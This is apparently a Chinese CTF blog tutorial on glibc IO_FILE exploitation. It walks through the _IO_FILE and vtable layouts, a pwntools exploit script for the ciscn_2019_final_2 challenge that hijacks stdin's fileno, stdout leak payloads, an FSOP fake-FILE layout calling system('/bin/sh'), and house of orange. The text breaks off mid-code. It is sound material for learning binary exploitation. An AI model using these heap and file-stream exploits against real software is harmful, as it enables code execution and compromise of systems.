<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> &#123;</span><br>  <span class="hljs-keyword">int</span> _flags;       <span class="hljs-comment">/* High-order word is _IO_MAGIC; rest is flags. */</span><br>  <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _IO_file_flags _flags</span><br>    <br>  <span class="hljs-comment">/* The following pointers correspond to the C++ streambuf protocol. */</span><br>  <span class="hljs-comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span><br>  <span class="hljs-keyword">char</span>* _IO_read_ptr;   <span class="hljs-comment">/* Current read pointer */</span><br>  <span class="hljs-keyword">char</span>* _IO_read_end;   <span class="hljs-comment">/* End of get area. */</span><br>  <span class="hljs-keyword">char</span>* _IO_read_base;  <span class="hljs-comment">/* Start of get area. */</span><br>  <span class="hljs-keyword">char</span>* _IO_write_base; <span class="hljs-comment">/* Start of put area. */</span><br>  <span class="hljs-keyword">char</span>* _IO_write_ptr;  <span class="hljs-comment">/* Current put pointer. */</span><br>  <span class="hljs-keyword">char</span>* _IO_write_end;  <span class="hljs-comment">/* End of put area. */</span><br>  <span class="hljs-keyword">char</span>* _IO_buf_base;   <span class="hljs-comment">/* Start of reserve area. */</span><br>  <span class="hljs-keyword">char</span>* _IO_buf_end;    <span class="hljs-comment">/* End of reserve area. */</span><br>  <span class="hljs-comment">/* The following fields are used to support backing up and undo. */</span><br>  <span class="hljs-keyword">char</span> *_IO_save_base; <span class="hljs-comment">/* Pointer to start of non-current get area. */</span><br>  <span class="hljs-keyword">char</span> *_IO_backup_base;  <span class="hljs-comment">/* Pointer to first valid character of backup area */</span><br>  <span class="hljs-keyword">char</span> *_IO_save_end; <span class="hljs-comment">/* Pointer to end of non-current get area. */</span><br> <br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_marker</span> *_<span class="hljs-title">markers</span>;</span><br> <br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">chain</span>;</span><br> <br>  <span class="hljs-keyword">int</span> _fileno;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> 0</span><br>  <span class="hljs-keyword">int</span> _blksize;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>  <span class="hljs-keyword">int</span> _flags2;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>  _IO_off_t _old_offset; <span class="hljs-comment">/* This used to be _offset but it&#x27;s too small.  */</span><br> <br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __HAVE_COLUMN <span class="hljs-comment">/* temporary */</span></span><br>  <span class="hljs-comment">/* 1+column number of pbase(); 0 is unknown. */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> _cur_column;<br>  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">char</span> _vtable_offset;<br>  <span class="hljs-keyword">char</span> _shortbuf[<span class="hljs-number">1</span>];<br> <br><span class="hljs-comment">/*  char* _save_gptr;  char* _save_egptr; */</span><br> <br>_IO_lock_t *_lock;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span><br>&#125;;<br></code></pre></td></tr></table></figure>

<p>在 _IO_FILE 中的各变量的偏移：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x0</span>   _flags<br><span class="hljs-number">0x8</span>   _IO_read_ptr<br><span class="hljs-number">0x10</span>  _IO_read_end<br><span class="hljs-number">0x18</span>  _IO_read_base<br><span class="hljs-number">0x20</span>  _IO_write_base<br><span class="hljs-number">0x28</span>  _IO_write_ptr<br><span class="hljs-number">0x30</span>  _IO_write_end<br><span class="hljs-number">0x38</span>  _IO_buf_base<br><span class="hljs-number">0x40</span>  _IO_buf_end<br><span class="hljs-number">0x48</span>  _IO_save_base<br><span class="hljs-number">0x50</span>  _IO_backup_base<br><span class="hljs-number">0x58</span>  _IO_save_end<br><span class="hljs-number">0x60</span>  _markers<br><span class="hljs-number">0x68</span>  _chain<br><span class="hljs-number">0x70</span>  _fileno<br><span class="hljs-number">0x74</span>  _flags2<br><span class="hljs-number">0x78</span>  _old_offset<br><span class="hljs-number">0x80</span>  _cur_column<br><span class="hljs-number">0x82</span>  _vtable_offset<br><span class="hljs-number">0x83</span>  _shortbuf<br><span class="hljs-number">0x88</span>  _lock<br><span class="hljs-number">0x90</span>  _offset<br><span class="hljs-number">0x98</span>  _codecvt<br><span class="hljs-number">0xa0</span>  _wide_data<br><span class="hljs-number">0xa8</span>  _freeres_list<br><span class="hljs-number">0xb0</span>  _freeres_buf<br><span class="hljs-number">0xb8</span>  __pad5<br><span class="hljs-number">0xc0</span>  _mode<br><span class="hljs-number">0xc4</span>  _unused2<br><span class="hljs-number">0xd8</span>  vtable<br></code></pre></td></tr></table></figure>

<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20211122203241140.png"><span class="image-caption">image-20211122203241140</span></p>
<p>在glibc-2.23版本中有个全局变量<code>_IO_list_all</code>，该变量指向了FILE链表的头部。在没有创建其它文件结构时，<code>_IO_list_all</code>指向stderr，然后依次是stdout和stdin。这里使用<code>p/x *(struct _IO_FILE_plus*) _IO_list_all</code>可以详细的打印其内存数据信息。其中<code>_fileno</code>的值就是文件描述符，<code>_chain</code>字段指向下一个链表节点</p>
<p>所有的文件都共享一个虚函数表，_IO_jump_t  *vtable则指向这个虚函数表（保存各种操作函数的指针），源码如下：JUMP_FIELD 是一个接收两个参数的宏，前一个参数为类型名，后一个为变量名</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> JUMP_FIELD(TYPE, NAME) TYPE NAME</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span></span><br><span class="hljs-class">&#123;</span><br>    JUMP_FIELD(<span class="hljs-keyword">size_t</span>, __dummy);<br>    JUMP_FIELD(<span class="hljs-keyword">size_t</span>, __dummy2);<br>    JUMP_FIELD(_IO_finish_t, __finish);<br>    JUMP_FIELD(_IO_overflow_t, __overflow);<br>    JUMP_FIELD(_IO_underflow_t, __underflow);<br>    JUMP_FIELD(_IO_underflow_t, __uflow);<br>    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);<br>    <span class="hljs-comment">/* showmany */</span><br>    JUMP_FIELD(_IO_xsputn_t, __xsputn);<br>    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);<br>    JUMP_FIELD(_IO_seekoff_t, __seekoff);<br>    JUMP_FIELD(_IO_seekpos_t, __seekpos);<br>    JUMP_FIELD(_IO_setbuf_t, __setbuf);<br>    JUMP_FIELD(_IO_sync_t, __sync);<br>    JUMP_FIELD(_IO_doallocate_t, __doallocate);<br>    JUMP_FIELD(_IO_read_t, __read);<br>    JUMP_FIELD(_IO_write_t, __write);<br>    JUMP_FIELD(_IO_seek_t, __seek);<br>    JUMP_FIELD(_IO_close_t, __close);<br>    JUMP_FIELD(_IO_stat_t, __stat);<br>    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);<br>    JUMP_FIELD(_IO_imbue_t, __imbue);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> 0</span><br>    get_column;<br>    set_column;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure>

<p>在gdb中查看，会对存储的函数指针更加详细的名称</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20211122204732406.png"><span class="image-caption">image-20211122204732406</span></p>
<h2 id="利用手法"><a href="#利用手法" class="headerlink" title="利用手法"></a>利用手法</h2><h3 id="一、利用-fileno"><a href="#一、利用-fileno" class="headerlink" title="一、利用_fileno"></a>一、利用_fileno</h3><p>因为<code>_fileno</code>的值就是文件描述符，有时flag文件已经被程序打开，创建了相应的文件描述符。如果我们将这个文件描述符的值填入到<code>stdin</code>的<code>_fileno</code>处，那么当使用到如<code>scanf、gets、fscanf</code>函数会调用到<code>stdin</code>，获取的到的字符就就会是flag的内容，将其输出即可</p>
<h4 id="例题ciscn-2019-final-2"><a href="#例题ciscn-2019-final-2" class="headerlink" title="例题ciscn_2019_final_2"></a>例题ciscn_2019_final_2</h4><p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20211128191339962.png"><span class="image-caption">image-20211128191339962</span></p>
<p>常规checksec，64位，保护全开</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20211128191623857-16380981914061.png"><span class="image-caption">image-20211128191623857</span></p>
<p>程序开了沙箱，禁用了execve系统执行函数</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20211128191723423.png"><span class="image-caption">image-20211128191723423</span></p>
<p>程序在初始化时，打开了flag文件，并且把文件描述符转为了666</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20211128191423540.png"><span class="image-caption">image-20211128191423540</span></p>
<p>释放堆块存在UAF</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20211128191445436.png"><span class="image-caption">image-20211128191445436</span></p>
<p>申请堆块只能申请0x10和0x20的堆块</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20211128211402143.png"><span class="image-caption">image-20211128211402143</span></p>
<p>还有个输入函数，执行完会把输入的内容打印出来</p>
<p>所以做法是劫持 stdin 的fileno为666从而读取flag内容并且打印出来，因为 scanf 获取的输入是来自于 stdin ，如果把 stdin 的fileno 修改为之前 flag 文件流对应的文件描述符666，即可实现 stdin 从flag里面读取内容，然后程序会把内容打印出来，从而获得flag</p>
<p>这边最有意思的点在于最后要分配到stdin上的堆块，由于泄露的地址是不全的，并且我们的任意分配是借助double free制造的堆块重叠，是不存在0x7f的头的，所以要申请出一块含有0x7f头的堆块，部分写修改0x7f为 stdin 的地址，然后在double free制造出堆块重叠时，借助第一次申请，把fd指向的堆块地址修改为含有 stdin 的地址的堆块，就能让其也成为tcache链上的一个堆块，从而成功分配出堆块</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20211128211228537.png"><span class="image-caption">image-20211128211228537</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./ciscn_final_2&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">25539</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br>	<span class="hljs-comment">#gdb.attach(p,&quot;b *$rebase(0x)&quot;)</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx, content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.recvuntil(<span class="hljs-string">&quot;your inode number:&quot;</span>)<br>    p.send(<span class="hljs-built_in">str</span>(content))<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>():</span><br>    p.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;what do you want to say at last?\n&quot;</span>)<br>    p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot; &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x20</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x20</span>)<br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br>p.recvuntil(<span class="hljs-string">&quot;your int type inode number :&quot;</span>)<br>heap_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">10</span>)) - <span class="hljs-number">0x250</span><br>log.info(<span class="hljs-string">&quot;heap_base==&gt;0x%x&quot;</span> %heap_base)<br>add(<span class="hljs-number">1</span>, heap_base)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x20</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    free(<span class="hljs-number">1</span>)<br>    add(<span class="hljs-number">2</span>, <span class="hljs-number">0x20</span>)<br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br>p.recvuntil(<span class="hljs-string">&quot;your int type inode number :&quot;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">10</span>))  - <span class="hljs-number">0x3ebca0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>fileno = libc_base + <span class="hljs-number">0x3eba70</span><br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x0202</span>)<br>add(<span class="hljs-number">1</span>, fileno)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">2</span>, fileno)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">1</span>, heap_base + <span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">666</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">666</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">666</span>)<br>edit()<br><br>p.interactive()<br></code></pre></td></tr></table></figure>



<h3 id="二、劫持文件流"><a href="#二、劫持文件流" class="headerlink" title="二、劫持文件流"></a>二、劫持文件流</h3><p>fopen函数在分配空间，建立FILE结构体，未调用vtable中的函数。执行流程如下：</p>
<ol>
<li><code>malloc</code>分配内存空间。</li>
<li><code>_IO_no_init</code> 对FILE结构体进行<code>null</code>初始化。</li>
<li><code>_IO_file_init</code>将结构体链接进<code>_IO_list_all</code>链表。</li>
<li><code>_IO_file_fopen</code>执行系统调用打开文件。</li>
</ol>
<p>fread函数中调用的vtable函数有：</p>
<ul>
<li><code>_IO_sgetn</code>函数调用了vtable的<code>_IO_file_xsgetn</code>。</li>
<li><code>_IO_doallocbuf</code>函数调用了vtable的<code>_IO_file_doallocate</code>以初始化输入缓冲区。</li>
<li>vtable中的<code>_IO_file_doallocate</code>调用了vtable中的<code>__GI__IO_file_stat</code>以获取文件信息。</li>
<li><code>__underflow</code>函数调用了vtable中的<code>_IO_new_file_underflow</code>实现文件数据读取到缓冲区。</li>
<li>vtable中的<code>_IO_new_file_underflow</code>调用了vtable<code>__GI__IO_file_read</code>最终去执行系统调用read。</li>
</ul>
<p>fwrite 函数调用的vtable函数有：</p>
<ul>
<li><code>_IO_fwrite</code>函数调用了vtable的<code>_IO_new_file_xsputn</code>。</li>
<li><code>_IO_new_file_xsputn</code>函数调用了vtable中的<code>_IO_new_file_overflow</code>实现缓冲区的建立以及刷新缓冲区。</li>
<li>vtable中的<code>_IO_new_file_overflow</code>函数调用了vtable的<code>_IO_file_doallocate</code>以初始化输入缓冲区。</li>
<li>vtable中的<code>_IO_file_doallocate</code>调用了vtable中的<code>__GI__IO_file_stat</code>以获取文件信息。</li>
<li><code>new_do_write</code>中的<code>_IO_SYSWRITE</code>调用了vtable<code>_IO_new_file_write</code>最终去执行系统调用write。</li>
</ul>
<p>fclose 函数调用的vtable函数有：</p>
<ul>
<li>在清空缓冲区的<code>_IO_do_write</code>函数中会调用vtable中的函数。</li>
<li>关闭文件描述符<code>_IO_SYSCLOSE</code>函数为vtable中的<code>__close</code>函数。</li>
<li><code>_IO_FINISH</code>函数为vtable中的<code>__finish</code>函数。</li>
</ul>
<ul>
<li>printf/puts 最终会调用_IO_file_xsputn</li>
<li>fclose 最终会调用_IO_FILE_FINISH</li>
<li>fwrite最终会调用_IO_file_xsputn</li>
<li>fread 最终会调用_IO_file_xsgetn</li>
<li>scanf/gets最终会调用_IO_file_xsgetn</li>
</ul>
<h4 id="方式一、劫持vtable"><a href="#方式一、劫持vtable" class="headerlink" title="方式一、劫持vtable"></a>方式一、劫持vtable</h4><p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20211111215424904.png"><span class="image-caption">image-20211111215424904</span></p>
<p>而在调用fclose关闭一个文件时，最终会调用到vtable中存储的函数指针。如果我们能够将vtable中的指针替换为我们自己想要跳转到的地址就可以劫持程序流程</p>
<p>覆盖vtable指针指向可控内存，将__finish(off=2*SIZE_T)构造为要执行的地址。然后调用fclose</p>
<h4 id="方式二、伪造vtable"><a href="#方式二、伪造vtable" class="headerlink" title="方式二、伪造vtable"></a>方式二、伪造vtable</h4><p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20211111215424904.png"><span class="image-caption">image-20211111215424904</span></p>
<p>当无法直接修改vtable指针时，却可以修改返回的文件指针fp。这时候就要伪造整个FILE结构体通过检查，再在伪造的FILE结构里面修改vtable指针以及__finish(off=2*SIZE_T)。将文件指针指向这个伪造的FILE结构体，最后调用fclose</p>
<h3 id="三、利用stdout泄露libc"><a href="#三、利用stdout泄露libc" class="headerlink" title="三、利用stdout泄露libc"></a>三、利用stdout泄露libc</h3><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> &#123;</span><br>  <span class="hljs-keyword">int</span> _flags;            <span class="hljs-comment">// 文件标志，简单的说：像puts一类的输入输出函数要想正确的打印信息就需要正确设置该字段</span><br>  <span class="hljs-keyword">char</span>* _IO_read_ptr;    <span class="hljs-comment">/* Current read pointer */</span><br>  <span class="hljs-keyword">char</span>* _IO_read_end;    <span class="hljs-comment">/* End of get area. */</span><br>  <span class="hljs-keyword">char</span>* _IO_read_base;    <span class="hljs-comment">/* Start of putback+get area. */</span><br>  <span class="hljs-keyword">char</span>* _IO_write_base;    <span class="hljs-comment">/* Start of put area. */</span><br>  <span class="hljs-keyword">char</span>* _IO_write_ptr;    <span class="hljs-comment">/* Current put pointer. */</span><br>  <span class="hljs-keyword">char</span>* _IO_write_end;    <span class="hljs-comment">/* End of put area. */</span><br>......<br>......<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这个利用方法较为常见，一般在没有打印函数时，用于泄露libc。将堆块分配到<code>stdout</code>指针处存储的<code>_IO_2_1_stdout_</code>该IO_FILE结构体处，修改其<code>_flags</code>为<code>0xfbad1800</code>，将后面三个read指针置空，将<code>_IO_write_base</code>处的第一个字节改为\x58，后面的<code>_IO_write_ptr</code>和<code>_IO_write_end</code>保持不变。之后当程序遇到puts函数时就会打印<code>_IO_write_base</code>到<code>_IO_write_ptr</code>之间的内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">payload = p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + <span class="hljs-string">&#x27;\x58&#x27;</span><br>libc_base = libc - libc.sym[<span class="hljs-string">&quot;_IO_file_jumps&quot;</span>]<br></code></pre></td></tr></table></figure>

<p>这样泄露出来的第一个地址将会是<code>_IO_file_jumps</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">payload = p64(<span class="hljs-number">0xfbad3887</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p8(<span class="hljs-number">0</span>)<br>libc_base = libc - libc.sym[<span class="hljs-string">&quot;_IO_2_1_stdin_&quot;</span>]<br></code></pre></td></tr></table></figure>

<p>这样泄露出来的第一个地址将会是<code>_IO_2_1_stdin_</code></p>
<h3 id="四、FSOP"><a href="#四、FSOP" class="headerlink" title="四、FSOP"></a>四、FSOP</h3><p>FSOP（ File Stream Oriented Programming ），是一种劫持<code>_IO_list_all</code>来伪造文件流对象链表的利用技术，通过调用_IO_flush_all_lockp()函数触发。该函数会在下面三种情况下被调用：第一，libc 检测到内存错误从而执行 abort 流程时；第二，执行 exit 函数时；第三，main 函数返回时</p>
<p>一般在pwn题中，我们都是构造内存错误(double free漏洞可以触发)，此时会产生一系列的函数调用路径，最终的调用为：<code>_IO_flush_all_lockp</code> –&gt; <code>_IO_OVERFLOW</code>，而这里的<code>_IO_OVERFLOW</code>就是文件流对象虚表的第四项指向的内容<code>_IO_new_file_overflow</code>，如下图所示</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20211122204732406-16375881553361.png"><span class="image-caption">image-20211122204732406</span></p>
<p>详细的原理就不说明了，自行百度查找。这里直接介绍的就是构造方式：首先需要将<code>_IO_list_all</code>的<code>_chain</code>指针指向伪造的堆块；然后伪造堆块的内容布局如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"># 设 chunk_addr<br>&#123;<br>  file = &#123;<br>    _flags = <span class="hljs-string">&quot;/bin/sh\x00&quot;</span>, <span class="hljs-meta"># binsh 字符串     chunk_addr + 0x0</span><br>    _IO_read_ptr = <span class="hljs-number">0x0</span>,<br>    _IO_read_end = <span class="hljs-number">0x0</span>,<br>    _IO_read_base = <span class="hljs-number">0x0</span>,<br>    _IO_write_base = <span class="hljs-number">0x0</span>,   #                  chunk_addr + <span class="hljs-number">0x20</span><br>    _IO_write_ptr = <span class="hljs-number">0x1</span>,    # 保证 ptr &gt; base  chunk_addr + <span class="hljs-number">0x28</span><br>  	...<br>  	...<br>  &#125;,                        # vtable_addr = chunk_addr + <span class="hljs-number">0xd8</span><br>  vtable = heap_addr        # 堆上另一个可控地址 heap_addr = chunk_addr + <span class="hljs-number">0xe0</span><br>&#125;<br><br>heap_addr &#123;<br>  __dummy = <span class="hljs-number">0x0</span>,<br>  __dummy2 = <span class="hljs-number">0x0</span>,<br>  __finish = <span class="hljs-number">0x0</span>,<br>  __overflow = system,      # _IO_OVERFLOW 覆盖为 system 的地址，其第一个参数就是chunk_addr <br>    ...                     # 因此这样构造我们就实现了 system(<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br>	...<br>&#125;<br><br></code></pre></td></tr></table></figure>

<h4 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h4><p>著名手法，在glibc-2.24及以下可以使用，unsorted bin attack 加上 FSOP 的结合。</p>
<p>先介绍一下原理：</p>
<p>如果在分配堆块时， top chunk 不够分配，那么根据申请的大小，会通过sysmalloc 来分配，如果申请的大小小于mmap的阀值的话，就会扩展top chunk，将old top chunk free掉，如果大于的话，就会通过mmap申请一块新的堆块。所以可以通过把 top chunk size 改小这种方式让 top chunk 进入unsorted bin 中，从而产生 libc 地址。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (av == <span class="hljs-literal">NULL</span><br>    || ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (mp_.mmap_threshold)<br>        &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))<span class="hljs-comment">/*这里进行判断，判断分配的大小是否大于mmap分配的阀值，如果大于就是用mmap从新分配一个堆块，否则就会扩展top chunk*/</span><br>  &#123;<br>    <span class="hljs-keyword">char</span> *mm;           <span class="hljs-comment">/* return value from mmap call*/</span><br>  try_mmap:<br>  <br>  .........<br>  ..........<br>    <span class="hljs-keyword">if</span> (old_size != <span class="hljs-number">0</span>)<br>                  &#123;<br>                    <span class="hljs-comment">/*</span><br><span class="hljs-comment">                       Shrink old_top to insert fenceposts, keeping size a</span><br><span class="hljs-comment">                       multiple of MALLOC_ALIGNMENT. We know there is at least</span><br><span class="hljs-comment">                       enough space in old_top to do this.</span><br><span class="hljs-comment">                     */</span><br>                    old_size = (old_size - <span class="hljs-number">4</span> * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK;<br>                    set_head (old_top, old_size | PREV_INUSE);<br>                    set_head (chunk_at_offset (old_top, old_size),<br>                              (<span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE);<br>                    set_head (chunk_at_offset (old_top, old_size + <span class="hljs-number">2</span> * SIZE_SZ),<br>                              (<span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE);<br>                    <span class="hljs-comment">/* If possible, release the rest. */</span><br>                    <span class="hljs-keyword">if</span> (old_size &gt;= MINSIZE)<br>                      &#123;<br>                        _int_free (av, old_top, <span class="hljs-number">1</span>);<span class="hljs-comment">/*将old top chunk free掉，加入unsorted bin*/</span><br>                      &#125;<br>                  &#125;<br></code></pre></td></tr></table></figure>

<p>house of orange 利用过程：</p>
<p>修改一个 unsorted chunk 的size字段为0x60，利用 unsorted bin attack 将 _IO_list_all 修改为 main_arena+0x58，而IO_list_all 中的 *chain 指针位于 _IO_list_all + 0x68 的位置：即main_arena + 0x58 + 0x68 是 small bin中大小为0x60的位置，所以需要将 chunk 的size修改为0x60，让该 chunk 链入 small bin 的相应位置上，在其上布置好伪造的 _IO_FILE_plus，那么就形成了一个伪造的 chain 链。伪造这些后，只要再分配一个chunk，就会触发malloc_printerr，会遍历IO_llist_all，最终调用 IO_overflow函数</p>
<p>malloc_printerr：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__builtin_expect (chunksize_nomask (victim) &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>           || __builtin_expect (chunksize_nomask (victim)<br>                                &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>         malloc_printerr (<span class="hljs-string">&quot;malloc(): memory corruption&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>触发 malloc_printerr 后，会形成下列调用链：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">mallloc_printerr-&gt; __libc_message—&gt;<span class="hljs-built_in">abort</span>-&gt;flush-&gt;_IO_flush_all_lock-&gt;_IO_OVERFLOW<br>而_IO_OVERFLOW最后会调用vtable表中的__overflow 函数<br></code></pre></td></tr></table></figure>

<p>_IO_flush_all_lockp：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">_IO_flush_all_lockp (<span class="hljs-keyword">int</span> do_lock)<br>&#123;<br>  <span class="hljs-keyword">int</span> result = <span class="hljs-number">0</span>;<br>  FILE *fp;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  _IO_cleanup_region_start_noarg (flush_cleanup);<br>  _IO_lock_lock (list_all_lock);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>  <span class="hljs-keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="hljs-literal">NULL</span>; fp = fp-&gt;_chain)<br>    &#123;<br>      run_fp = fp;<br>      <span class="hljs-keyword">if</span> (do_lock)<br>        _IO_flockfile (fp);<br>      <span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<span class="hljs-comment">/*一些检查，需要绕过*/</span><br>           || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>               &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr<br>                                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<span class="hljs-comment">/*也可以绕过这个*/</span><br>           )<br>          &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<span class="hljs-comment">/*遍历_IO_list_all ，选出_IO_FILE作为_IO_OVERFLOW的参数，执行函数*/</span><br>        result = EOF;<br>      <span class="hljs-keyword">if</span> (do_lock)<br>        _IO_funlockfile (fp);<br>      run_fp = <span class="hljs-literal">NULL</span>;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  _IO_lock_unlock (list_all_lock);<br>  _IO_cleanup_region_end (<span 